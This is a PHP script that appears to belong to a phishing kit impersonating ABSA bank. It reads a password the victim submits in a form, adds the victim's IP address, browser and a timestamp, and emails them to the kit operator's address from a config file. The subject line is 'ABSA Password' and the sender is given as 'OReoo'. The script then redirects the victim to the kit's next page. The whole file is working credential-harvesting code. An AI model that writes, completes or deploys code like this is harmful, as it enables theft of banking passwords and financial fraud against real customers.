<?php
session_start();
error_reporting(0);
require_once 'os.php'; 
$infodate   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$ip = $_SERVER['REMOTE_ADDR'];

$passwords = $_SESSION['passwords'] = $_POST['passwords'];

$message = '
💸 [Password] 💸
<br>
Password     : '.$passwords.'  
<br>
💻 [Info] 💻
<br>
IP Address     : '.$ip.' 
<br>
Country     : '.$country.' 
<br>
Browser        : '.$browserTy_Version.' 
<br> 
Time           : '.$infodate.' 
<br>
💸 [Password] 💸
';

require_once '../config.php';
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "ABSA Password 💸 [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: OReoo" . "\r\n";
mail($yourmail, $subject, $message, $headers);
header("Location: ../app/express.php");
